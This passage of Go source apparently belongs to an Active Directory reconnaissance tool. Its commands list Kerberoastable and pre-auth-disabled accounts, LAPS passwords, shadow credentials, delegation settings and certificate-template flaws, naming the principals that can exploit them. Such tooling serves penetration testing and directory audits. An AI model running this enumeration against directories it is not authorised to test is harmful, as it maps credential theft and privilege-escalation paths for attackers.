		fmt.Printf("  Validity Period             : %s\n", t.ValidityPeriod)
	}
	if t.RenewalPeriod != "" {
		fmt.Printf("  Renewal Period              : %s\n", t.RenewalPeriod)
	}

	// ESC flags
	if t.NoSecurityExtension {
		fmt.Printf("  [!] No Security Extension   : True (ESC9)\n")
	}

	// Enrollment permissions
	if len(t.EnrollmentPrincipals) > 0 {
		fmt.Printf("  Enrollment Permissions:\n")
		for _, perm := range t.EnrollmentPrincipals {
			permType := ""
			if perm.CanEnroll {
				permType = "Enroll"
			}
			if perm.CanAutoEnroll {
				if permType != "" {
					permType += ", "
				}
				permType += "AutoEnroll"
			}
			fmt.Printf("    [+] %s (%s): %s\n", perm.PrincipalName, perm.PrincipalType, permType)
		}
	}

	// Object controllers (ESC4)
	if len(t.ObjectControllers) > 0 {
		fmt.Printf("  Dangerous Object Permissions (ESC4):\n")
		for _, perm := range t.ObjectControllers {
			fmt.Printf("    [!] %s (%s): %s\n", perm.PrincipalName, perm.PrincipalType, perm.Permission)
		}
	}

	// ESC vulnerability details
	for _, vuln := range t.ESCVulnerabilities {
		fmt.Printf("  [!] %s: %s\n", vuln.Name, vuln.Description)
		if len(vuln.Principals) > 0 {
			fmt.Printf("      Exploitable by: %s\n", strings.Join(vuln.Principals, ", "))
		}
	}

	fmt.Println()
}

func getEKUName(oid string) string {
	ekuNames := map[string]string{
		ldaptickler.OIDClientAuthentication:    "Client Authentication",
		ldaptickler.OIDSmartCardLogon:          "Smart Card Logon",
		ldaptickler.OIDPKINITClientAuth:        "PKINIT Client Authentication",
		ldaptickler.OIDAnyPurpose:              "Any Purpose",
		ldaptickler.OIDCertificateRequestAgent: "Certificate Request Agent",
		ldaptickler.OIDServerAuth:              "Server Authentication",
		"1.3.6.1.5.5.7.3.4":                    "Secure Email",
		"1.3.6.1.5.5.7.3.3":                    "Code Signing",
		"1.3.6.1.4.1.311.10.3.4":               "EFS",
		"1.3.6.1.4.1.311.21.5":                 "CA Exchange",
	}

	if name, ok := ekuNames[oid]; ok {
		return name
	}
	return "Unknown"
}

func expandlist(in []string) []string {
	var out []string
	for _, s := range in {
		out = append(out, strings.Split(s, ",")...)
	}

	return out
}

func filter(c *ldaptickler.Tickler, args ...string) error {
	filter := cli.Arg(1)
	fmt.Printf(
		"[+] Searching with specified filter: %s in LDAP with baseDN %s\n",
		filter,
		flags.basedn,
	)
	results, err := c.LDAPSearch(
		flags.searchscope,
		filter,
		expandlist(flags.attributes),
	)
	if err != nil {
		return err
	}
	results.Print()
	return nil
}

func fsmoroles(c *ldaptickler.Tickler, args ...string) error {
	fmt.Printf(
		"[+] Searching for all FSMO role holders in LDAP with baseDN %s\n",
		flags.basedn,
	)

	results, err := c.ListFSMORoles()
	if err != nil {
		return err
	}
	results.Print()
	return nil
}

func gmsaaccounts(c *ldaptickler.Tickler, args ...string) error {
	fmt.Printf(
		"[+] Searching for all Group Managed Service Accounts in LDAP with baseDN %s\n",
		flags.basedn,
	)

	results, err := c.ListGMSAaccounts()
	if err != nil {
		return err
	}
	results.Print()
	return nil
}

func groups(c *ldaptickler.Tickler, args ...string) error {
	fmt.Printf(
		"[+] Searching for all groups in LDAP with baseDN %s\n",
		flags.basedn,
	)

	results, err := c.ListGroups()
	if err != nil {
		return err
	}
	results.Print()
	return nil
}

func groupswithmembers(c *ldaptickler.Tickler, args ...string) error {
	fmt.Printf(
		"[+] Searching for all groups and their members in LDAP with baseDN %s\n",
		flags.basedn,
	)

	results, err := c.ListGroupswithMembers()
	if err != nil {
		return err
	}
	results.Print()
	return nil
}

func kerberoastable(c *ldaptickler.Tickler, args ...string) error {
	fmt.Printf(
		"[+] Searching for all Kerberoastable users in LDAP with baseDN %s\n",
		flags.basedn,
	)

	results, err := c.ListKerberoastable()
	if err != nil {
		return err
	}
	results.Print()
	return nil
}

func laps(c *ldaptickler.Tickler, args ...string) error {
	fmt.Printf(
		"[+] Searching for all LAPS passwords in LDAP with baseDN %s\n",
		flags.basedn,
	)

	err := c.ListLAPS()
	if err != nil {
		return err
	}

	return nil
}

func machineaccountquota(c *ldaptickler.Tickler, args ...string) error {
	fmt.Printf(
		"[+] Searching for ms-DS-MachineAccountQuota in LDAP with baseDN %s\n",
		flags.basedn,
	)

	results, err := c.ListMachineAccountQuota()
	if err != nil {
		return err
	}
	results.Print()
	return nil
}

func machinecreationdacl(c *ldaptickler.Tickler, args ...string) error {
	fmt.Printf(
		"[+] Searching for ms-DS-MachineCreationRestrictedToDACL in LDAP with baseDN %s\n",
		flags.basedn,
	)

	results, err := c.ListMachineCreationDACL()
	if err != nil {
		return err
	}
	results.Print()
	return nil
}

func nopassword(c *ldaptickler.Tickler, args ...string) error {
	fmt.Printf(
		"[+] Searching for all users not required to have a password in LDAP with baseDN %s\n",
		flags.basedn,
	)

	results, err := c.ListNoPassword()
	if err != nil {
		return err
	}
	results.Print()
	return nil
}

func objectquery(c *ldaptickler.Tickler, args ...string) error {
	objectname := cli.Arg(1)
	fmt.Printf(
		"[+] Searching for attributes of object %s in LDAP with baseDN %s\n",
		objectname,
		flags.basedn,
	)
	results, err := c.FindUserByName(objectname, flags.searchscope)
	if err != nil {
		return err
	}
	results.Print()
	return nil
}

func passworddontexpire(c *ldaptickler.Tickler, args ...string) error {
	fmt.Printf(
		"[+] Searching for all users all objects where the password doesn't expire in LDAP with baseDN %s\n",
		flags.basedn,
	)

	results, err := c.ListPasswordDontExpire()
	if err != nil {
		return err
	}
	results.Print()
	return nil
}

func passwordchangenextlogin(
	c *ldaptickler.Tickler,
	args ...string,
) error {
	fmt.Printf(
		"[+] Searching for all users all objects where the password is set to change at next login in LDAP with baseDN %s\n",
		flags.basedn,
	)

	results, err := c.ListPasswordChangeNextLogin()
	if err != nil {
		return err
	}
	results.Print()
	return nil
}

func protectedusers(c *ldaptickler.Tickler, args ...string) error {
	fmt.Printf(
		"[+] Searching for all users in Protected Users group in LDAP with baseDN %s\n",
		flags.basedn,
	)

	results, err := c.ListProtectedUsers()
	if err != nil {
		return err
	}
	results.Print()
	return nil
}

func preauthdisabled(c *ldaptickler.Tickler, args ...string) error {
	fmt.Printf(
		"[+] Searching for all Kerberos Pre-auth Disabled users in LDAP with baseDN %s\n",
		flags.basedn,
	)

	results, err := c.ListPreAuthDisabled()
	if err != nil {
		return err
	}
	results.Print()
	return nil
}

func querydescription(c *ldaptickler.Tickler, args ...string) error {
	querydescription := cli.Arg(1)
	fmt.Printf(
		"[+] Searching all objects for a description of %s in LDAP with baseDN %s\n",
		querydescription,
		flags.basedn,
	)
	results, err := c.FindUserByDescription(querydescription)
	if err != nil {
		return err
	}
	results.Print()
	return nil
}

func rbcd(c *ldaptickler.Tickler, args ...string) error {
	fmt.Printf(
		"[+] Searching for all Resource Based Constrained Delegation objects in LDAP with baseDN %s\n",
		flags.basedn,
	)

	results, err := c.ListRBCD()
	if err != nil {
		return err
	}
	results.Print()
	return nil
}

func schema(c *ldaptickler.Tickler, args ...string) error {
	fmt.Printf(
		"[+] Listing schema for LDAP database with baseDN %s\n",
		flags.basedn,
	)

	results, err := c.ListSchema()
	if err != nil {
		return err
	}
	results.Print()
	return nil
}

func shadowcredentials(c *ldaptickler.Tickler, args ...string) error {
	fmt.Printf(
		"[+] Searching for all Shadow Credentials in LDAP with baseDN %s\n",
		flags.basedn,
	)

	err := c.ListShadowCredentials()
	if err != nil {
		return err
	}

	return nil
}

func unconstraineddelegation(
	c *ldaptickler.Tickler,
	args ...string,
) error {
	fmt.Printf(
		"[+] Searching for all Unconstrained Delegation objects in LDAP with baseDN %s\n",
		flags.basedn,
	)

	results, err := c.ListUnconstrainedDelegation()
	if err != nil {
		return err
	}
	results.Print()
	return nil
}

func users(c *ldaptickler.Tickler, args ...string) error {
	fmt.Printf(
		"[+] Searching for all users in LDAP with baseDN %s\n",
		flags.basedn,
	)
	results, err := c.ListUsers(expandlist(flags.attributes)...)
	if err != nil {
		return err
	}
	results.Print()
	return nil
}

func loginscripts(c *ldaptickler.Tickler, args ...string) error {
	fmt.Printf(
		"[+] Searching for all login scripts with baseDN %s\n",
		flags.basedn,
	)

	results, err := c.ListLoginScripts()
	if err != nil {
		return err
	}
	results.Print()
	return nil
}

func whoami(c *ldaptickler.Tickler, args ...string) error {
	fmt.Printf(
		"[+] Querying the server for WhoAmI with baseDN %s\n",
		flags.basedn,
	)

	result, err := c.GetWhoAmI()
	if err != nil {
		return err
	}
	fmt.Printf(
		"[+] You are currently authenticated as %s\n",
		result,
	)

	return nil
}
